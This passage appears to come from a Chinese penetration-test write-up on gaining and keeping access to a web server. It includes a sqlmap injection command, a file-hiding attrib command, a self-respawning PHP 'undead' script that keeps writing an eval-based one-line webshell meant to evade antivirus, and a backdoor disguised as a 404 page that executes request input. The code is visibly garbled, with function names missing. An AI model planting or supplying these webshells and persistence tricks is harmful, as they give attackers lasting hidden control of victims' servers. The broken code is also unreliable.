## 0x03 外网入口利用

外网入口利用的办法有很多，这里我只阐述数据库注入，目标站点还有XSS漏洞getwebshell，不再阐述。在本次渗透中，利用数据库注入点漏洞进行获取数据库有效信息，进而getwebshell。

### 3.1 查询当前数据库

```
\# sqlmap -u "xxxxx.com/xxxx.php?id=1" --current-db

```

## 0x04 权限提升与维持

### 4.1 提权 

利用Linux内核进行提权，但是内核提权服务器崩溃了。

### 4.2 权限维持

在getshell后，往往因为内网渗透的需要不得不长时间对目标进行持续威胁。

#### 4.2.1 隐藏文件

```


attrib +s +h xxx.php  //隐藏xxx.php文件
```

在文件夹下无法看到xxx.php，但仍然可以访问

#### 4.2.2 不死马

```

<?php(0)
;//程序执行时间(1)
;//关掉终端后脚本仍然运行(\_\_FILE\_\_)
;//文件完整名while(1){
('xxx.php','<?php $a=array($\_REQUEST\["xxx"\]=>"3");
$b=array\_keys($a)\[0\];
eval($b);?>')
;(5)
;}


```

该脚本每5秒向服务器创建xxx.php，并写入一句话免杀木马,结合attrib命令隐藏文件更好地建立后门。

#### 4.2.3 404页面隐藏后门

```


<html><head>function func(){
return @$\_REQUEST\["xxx"\]
;}
("/xxx/e",func(),"i am xxx")
;('HTTP/1.1 404 Not Found')

;
```
